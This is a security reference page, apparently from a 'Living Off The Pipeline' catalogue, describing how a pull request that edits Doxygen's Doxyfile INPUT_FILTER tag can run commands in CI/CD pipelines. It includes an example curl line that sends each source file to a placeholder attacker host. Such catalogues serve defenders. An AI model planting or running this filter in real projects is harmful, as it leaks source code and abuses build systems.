---
layout: tool
title: doxygen
parent: Living Off The Pipeline
nav_order: 34
---

## Living Off The Pipeline - doxygen

`Doxygen` is a documentation generator for various programming languages. It can be abused as a "Living Off The Pipeline" (LOTP) tool because its configuration file, the `Doxyfile`, can be manipulated to execute arbitrary shell commands.

### First-Order LOTP Tool

`Doxygen` is a **First-Order LOTP Tool**. It provides direct Remote Code Execution (RCE) by design, as it is intended to execute external helper programs defined in its configuration file.

#### Malicious Primitive: Remote Code Execution (RCE)

The `Doxyfile` is the configuration file for a Doxygen project. It contains numerous tags that control the documentation process. Several of these tags are designed to specify external programs for Doxygen to execute. The most direct vector is the `INPUT_FILTER` tag.

The `INPUT_FILTER` tag specifies a command that Doxygen will run for every source file it processes. An attacker can set this tag to a malicious shell command in a pull request. When a CI/CD pipeline runs the `doxygen` command, it will execute the attacker's payload for each file, leading to RCE.

### Second-Order LOTP Attack Chain

1.  **Attacker's PR:** An attacker submits a pull request with a modified `Doxyfile` containing a malicious `INPUT_FILTER`.
    ```
    # Doxyfile

    # Malicious payload to exfiltrate the content of every source file
    INPUT_FILTER = "sh -c 'curl --data-binary @$1 http://attacker.com/files'"
    ```
    (Doxygen replaces `$1` with the path to the input file.)

2.  **Vulnerable Workflow:** The pipeline contains a standard command to generate the project's documentation.
    ```yaml
    - name: Generate API documentation
      run: doxygen
    ```

3.  **Execution:**
    *   The `doxygen` command is executed.
    *   It reads the `Doxyfile` and finds the malicious `INPUT_FILTER` command.
    *   For each source file in the project, Doxygen executes the attacker's `sh -c 'curl...'` command.
    *   The attacker's payload runs repeatedly, exfiltrating the entire source code of the project to the attacker's server.

This attack is dangerous because the CI/CD workflow file is benign. The malicious payload is hidden in a configuration file for a seemingly harmless documentation tool.

### References

*   [Doxygen Manual: `INPUT_FILTER`](https://www.doxygen.nl/manual/config.html#cfg_input_filter)
